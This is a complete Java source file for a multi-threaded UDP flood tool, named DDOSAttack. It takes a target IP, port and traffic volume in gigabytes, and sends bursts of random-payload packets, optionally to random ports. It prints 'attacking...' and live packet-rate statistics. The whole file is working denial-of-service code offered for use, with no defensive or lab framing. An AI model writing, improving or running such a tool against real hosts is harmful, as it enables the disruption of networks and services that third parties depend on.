import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

/**
 *
 * Usage examples:
 *   java DDOS-Attack_06_c.java -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50
 *   java DDOS-Attack_06_c.java -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30
 *
 * Arguments:
 *   -t, --target        Target IP address (required)
 *   -p, --port          Target UDP port (required)
 *   -g, --gb            Total traffic in GB (required)
 *   -P, --processes     Number of threads (default 4)
 *   -b, --burst         Packets per burst (default 50)
 *   -r, --rate          Rate limit in seconds per burst (default 0, unlimited)
 *   -d, --duration      Duration in seconds (default 0, until finished)
 *   -s, --src-port      Source port base (default -1, random)
 *   --size              Packet size in bytes (default 1490)
 *   --random-port       Randomize target port
 *   --log               Log file path
 *   --max-retries       Max retry count (default 3)
 */
public class DDOSAttack {
    // ---------- Shared statistics ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- Configuration ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;

    // ---------- Pre-allocated SocketAddress array ----------
    private static InetSocketAddress[] portAddresses;

    // ===================================================================
    // Main function
    // ===================================================================
    public static void main(String[] args) throws Exception {
        // 1. Parse arguments (show help if no args)
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        // 2. Logging
        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] Failed to open log file: " + e.getMessage());
            }
        }

        // 3. Validate target
        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] Invalid target IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] Port out of range: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65507) packetSize = 65507;
        if (totalPackets <= 0) {
            System.err.println("[!] Total packets must be greater than 0");
            System.exit(1);
        }

        // 4. Pre-allocate address array
        if (randomTargetPort) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        // 5. One-line summary output
        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%n",
                targetIP, targetPort, (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "");
        System.out.println("[+] attacking... (Ctrl+C to stop)");

        // 6. Register shutdown hook (stop on Ctrl+C)
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopFlag = true;
        }));

        // 7. Prepare payload
        byte[] payload = new byte[packetSize];
        new Random().nextBytes(payload);

        // 8. Start attack
        long startTime = System.currentTimeMillis();
        startAttack(payload);
        long elapsed = System.currentTimeMillis() - startTime;

        // 9. Final statistics
        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.close();
        }
    }

    // ===================================================================
    // Usage help
    // ===================================================================
    private static void printUsage() {
        System.out.println("[+] Usage: java DDOSAttack -t <IP> -p <PORT> -g <GB> [options]");
        System.out.println();
        System.out.println("[+] Required arguments:");
        System.out.println("  -t, --target        Target IP address");
        System.out.println("  -p, --port          Target UDP port");
        System.out.println("  -g, --gb            Total traffic (GB)");
        System.out.println();
        System.out.println("[+] Optional arguments:");
        System.out.println("  -P, --processes     Number of threads (default 4)");
        System.out.println("  -b, --burst         Packets per burst (default 50)");
        System.out.println("  -r, --rate          Rate limit in seconds per burst (default 0)");
        System.out.println("  -d, --duration      Duration in seconds (default 0, until finished)");
        System.out.println("  -s, --src-port      Source port base (default -1, random)");
        System.out.println("      --size          Packet size in bytes (default 1490)");
        System.out.println("      --random-port   Randomize target port");
        System.out.println("      --log <file>    Log file path");
        System.out.println("      --max-retries   Max retry count (default 3)");
        System.out.println("  -h, --help          Show this help");
        System.out.println();
        System.out.println("[+] Examples:");
        System.out.println("  java DDOSAttack -t 192.168.1.100 -p 53 -g 1 -P 4 -b 50");
        System.out.println("  java DDOSAttack -t 10.0.0.1 -p 80 -g 0.5 -P 8 --random-port -d 30");
    }

    // ===================================================================
    // Argument parsing
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) {
            System.err.println("[!] Missing -t/--target");
            System.exit(1);
        }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] Missing -p/--port");
            System.exit(1);
        }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] Missing -g/--gb");
            System.exit(1);
        }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) {
            System.err.println("[!] GB must be greater than 0");
            System.exit(1);
        }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) {
            System.err.println("[!] Traffic too small");
            System.exit(1);
        }
    }

    // ===================================================================
    // Retry logic
    // ===================================================================
    private static boolean sendWithRetry(DatagramChannel channel, ByteBuffer buffer,
                                         SocketAddress target, int maxRetries) {
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buffer.clear();
                int written = channel.send(buffer, target);
                if (written > 0) return true;
            } catch (IOException e) {
                // Ignore and retry
            }
            attempts++;
        }
        return false;
    }

    // ===================================================================
    // Attack body
    // ===================================================================
    private static void startAttack(byte[] payload) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                ThreadLocalRandom random = ThreadLocalRandom.current();
                try (DatagramChannel channel = DatagramChannel.open()) {
                    channel.configureBlocking(true);
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    if (srcPortBase >= 0) {
                        int srcPort = srcPortBase + threadId;
                        DatagramSocket socket = channel.socket();
                        try {
                            socket.bind(new InetSocketAddress(srcPort));
                        } catch (BindException e) {
                            System.err.println("[!] Thread " + threadId + ": failed to bind port " + srcPort);
                        }
                    }

                    ByteBuffer buffer = ByteBuffer.wrap(payload);
                    long sent = 0;
                    long bytesSent = 0;
                    long dropped = 0;
                    long lastSent = 0, lastBytes = 0, lastDropped = 0;

                    while (!stopFlag && sent < pktCount) {
                        int toSend = (int) Math.min(burstSize, pktCount - sent);
                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = random.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            if (sendWithRetry(channel, buffer, targetAddr, maxRetries)) {
                                sent++;
                                bytesSent += packetSize;
                            } else {
                                dropped++;
                            }
                        }

                        // Incrementally update global statistics
                        long dSent = sent - lastSent;
                        long dBytes = bytesSent - lastBytes;
                        long dDropped = dropped - lastDropped;
                        if (dSent > 0) totalSent.add(dSent);
                        if (dBytes > 0) totalBytes.add(dBytes);
                        if (dDropped > 0) totalDropped.add(dDropped);
                        lastSent = sent;
                        lastBytes = bytesSent;
                        lastDropped = dropped;

                        if (rateLimit > 0) {
                            Thread.sleep((long) (rateLimit * 1000));
                        }
                    }

                    // Final incremental update
                    long dSent = sent - lastSent;
                    long dBytes = bytesSent - lastBytes;
                    long dDropped = dropped - lastDropped;
                    if (dSent > 0) totalSent.add(dSent);
                    if (dBytes > 0) totalBytes.add(dBytes);
                    if (dDropped > 0) totalDropped.add(dDropped);

                } catch (Exception e) {
                    System.err.println("[!] Thread " + threadId + " error: " + e.getMessage());
                }
            };
            futures.add(executor.submit(task));
        }

        // ---------- Progress monitoring ----------
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;

            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            // Print a short statistics line every 1 second
            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
                        sent, dataGB, rate, instantRate, dropped);
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        // Wait for all threads to finish
        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) {}
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }
}
